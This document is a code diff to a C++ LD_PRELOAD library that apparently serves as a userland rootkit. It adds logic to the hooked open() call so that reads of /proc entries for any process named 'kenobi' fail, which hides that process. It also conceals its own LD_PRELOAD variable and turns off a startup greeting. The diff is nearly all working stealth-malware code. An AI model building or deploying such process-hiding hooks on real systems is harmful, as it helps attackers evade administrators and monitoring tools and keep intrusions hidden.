@@ -25,13 +25,18 @@ SOFTWARE.*/
 
 #include <cstring>
 
-#include <stdexcept>
+#include <experimental/filesystem>
+#include <regex>
+#include <fstream>
 
 namespace {
 
 using namespace std::string_literals;
 
+namespace fs = std::experimental::filesystem;
+
 constexpr auto LD_PRELOAD = "LD_PRELOAD";
+constexpr auto KENOBI = "kenobi";
 
 void greeting() {
 	fputs("- Hello there.\n", stderr);
@@ -59,8 +64,7 @@ void export_ld_preload() {
     const std::string self_path{current_so_path()};
 
 	constexpr auto overwrite = true;
-    auto err = setenv(LD_PRELOAD, self_path.data(), overwrite);
-    if (err) {
+    if (auto err = setenv(LD_PRELOAD, self_path.data(), overwrite); err) {
 	    throw std::runtime_error("'setenv("s + LD_PRELOAD + ", " + self_path
 	                             + ")' failed: " + strerror(err));
     }
@@ -81,6 +85,47 @@ bool is_preloaded() {
 
 void hide_ld_preload() {
 	unsetenv(LD_PRELOAD);
+}
+
+pid_t to_pid(const std::string& path) {
+	static const std::regex pid_regex{"/proc/(\\d+)/.*"};
+	std::smatch pid_match{};
+	if (std::regex_match(path, pid_match, pid_regex)) {
+		std::stringstream s{pid_match[1]};
+		pid_t pid{};
+		s >> pid;
+		return pid;
+	}
+	return 0;
+}
+
+std::string proc_name(const pid_t pid) {
+	static const fs::path PROC{"/proc"};
+	std::ifstream stat{PROC / std::to_string(pid) / "stat"s};
+	if (!stat) {
+		return "";
+	}
+	std::string stat_line{};
+	std::getline(stat, stat_line);
+
+	static const std::regex pn_regex{".*\\((.*)\\).*"};
+	std::smatch pn_match{};
+	if (!std::regex_match(stat_line, pn_match, pn_regex)) {
+		return "";
+	}
+	return pn_match[1];
+}
+
+bool is_hiden(const fs::path& target) {
+	try {
+		const auto pid = to_pid(fs::canonical(target).generic_string());
+		if (!pid) {
+			return false;
+		}
+		return proc_name(pid) == KENOBI;
+	} catch (...) {
+		return false;
+	}
 }
 
 } // namespace
@@ -111,7 +156,9 @@ int open (const char *pathname, int flags, ...){
 	va_list args;
 	mode_t mode{};
 
-	// TODO some evil staff
+	if (is_hiden(fs::path(pathname))) {
+		return -1;
+	}
 
 	return real_open(pathname, flags, mode);
 }
@@ -121,7 +168,7 @@ int open (const char *pathname, int flags, ...){
 
 __attribute__((constructor))
 void init() {
-    greeting();
+    //greeting();
 	if (is_preloaded()) {
 		hide_ld_preload();
 	} else {
